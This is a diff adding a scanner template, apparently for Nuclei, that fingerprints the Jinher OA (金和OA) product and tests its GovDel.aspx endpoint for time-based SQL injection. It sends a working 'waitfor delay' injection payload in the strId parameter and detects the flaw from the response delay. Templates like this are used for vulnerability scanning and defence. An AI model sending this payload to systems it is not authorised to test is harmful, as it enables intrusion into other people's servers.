@@ -1,0 +1,43 @@
+id: poc-yaml-jinher-jhsoft-govdel-aspx-sqli
+info:
+  name: 金和OA GovDel.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.govsetaip/GovDel.aspx/?strId=1)waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: headers
+        words:
+          - "Cookie"
+      - type: dsl
+        dsl:
+          - "len(body) == 0"
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
